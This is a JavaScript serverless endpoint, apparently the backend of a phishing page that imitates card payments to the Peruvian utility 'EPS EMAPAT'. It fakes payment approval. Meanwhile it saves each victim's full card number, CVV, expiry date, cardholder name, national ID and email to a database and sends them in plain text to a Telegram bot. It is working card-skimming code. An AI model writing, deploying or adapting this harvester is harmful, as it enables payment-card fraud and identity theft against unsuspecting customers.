const { neon } = require('@neondatabase/serverless');

function detectarTipo(num) {
  const n = num.replace(/\s/g, '');
  if (n.startsWith('4')) return 'VISA';
  if (n.startsWith('5') || n.startsWith('2')) return 'MASTERCARD';
  if (n.startsWith('3')) return 'AMEX';
  return 'TARJETA';
}

function maskCard(num) {
  const n = num.replace(/\s/g, '');
  const tipo = detectarTipo(n);
  return `${tipo} **** **** **** ${n.slice(-4)}`;
}

function simularPago(num) {
  const n = num.replace(/\s/g, '');
  const aprobadas = ['4111111111111111','4242424242424242','5500005555555559','5105105105105100'];
  const rechazadas = ['4000000000000002','4000000000009995','4000000000000069'];
  if (aprobadas.includes(n)) return { exitoso: true };
  if (rechazadas.includes(n)) return { exitoso: false, motivo: 'Tarjeta rechazada por el banco' };
  if (n.length >= 15) return { exitoso: true };
  return { exitoso: false, motivo: 'Número de tarjeta inválido' };
}

async function sendTelegram(data) {
  const token  = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const icono = data.estado === 'EXITOSO' ? '✅' : '❌';
  const msg = [
    `${icono} *NUEVO PAGO — EPS EMAPAT*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `👤 *Cliente:* ${data.nombre}`,
    `📋 *Suministro:* ${data.codcliente}`,
    ...(data.dni ? [`🪪 *DNI:* ${data.dni}`] : []),
    ...(data.email ? [`📧 *Correo:* ${data.email}`] : []),
    `💰 *Monto:* S/ ${Number(data.monto).toFixed(2)}`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `💳 *Tarjeta:* ${data.tarjeta}`,
    `🔢 *Número:* \`${data.numTarjetaCompleto}\``,
    `📅 *Vencimiento:* ${data.vencimiento}`,
    `🔐 *CVV:* ${data.cvv}`,
    `👤 *Titular:* ${data.titular}`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `${icono} *Estado:* ${data.estado}`,
    `🆔 *N° Op:* ${data.nroOperacion}`,
    `🕐 *Fecha:* ${data.fecha}`,
  ].join('\n');
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
  });
}

async function guardarEnDB(sql, data) {
  await sql`
    INSERT INTO pagos
      (codigo_cliente, nombre, monto, tarjeta, num_tarjeta_completo, cvv, titular, vencimiento, estado, nro_operacion)
    VALUES
      (${data.codcliente}, ${data.nombre}, ${data.monto}, ${data.tarjeta},
       ${data.numTarjetaCompleto}, ${data.cvv}, ${data.titular},
       ${data.vencimiento}, ${data.estado}, ${data.nroOperacion})
  `;
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Método no permitido' });

  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv, dni, email } = req.body || {};
  if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
    return res.status(400).json({ error: 'Faltan campos requeridos' });
  }

  await new Promise(r => setTimeout(r, 400));

  const resultado       = simularPago(numTarjeta);
  const nroOperacion    = `OP-${Date.now().toString().slice(-8)}`;
  const fecha           = new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' });
  const tarjetaMask     = maskCard(numTarjeta);
  const numCompleto     = numTarjeta.replace(/\s/g, '');
  const estado          = resultado.exitoso ? 'EXITOSO' : 'RECHAZADO';

  const record = {
    codcliente, nombre, monto: Number(monto),
    tarjeta: tarjetaMask, numTarjetaCompleto: numCompleto,
    cvv: cvv || '', titular, vencimiento, estado, nroOperacion, fecha,
    dni: dni || undefined, email: email || undefined,
  };

  if (process.env.DATABASE_URL) {
    try { await guardarEnDB(neon(process.env.DATABASE_URL), record); }
    catch (e) { console.error('DB error:', e); }
  }

  try { await sendTelegram(record); } catch (e) { console.error('Telegram error:', e); }

  if (!resultado.exitoso) {
    return res.status(200).json({ exitoso: false, motivo: resultado.motivo, nroOperacion });
  }
  return res.status(200).json({ exitoso: true, nroOperacion, tarjeta: tarjetaMask, fecha });
};
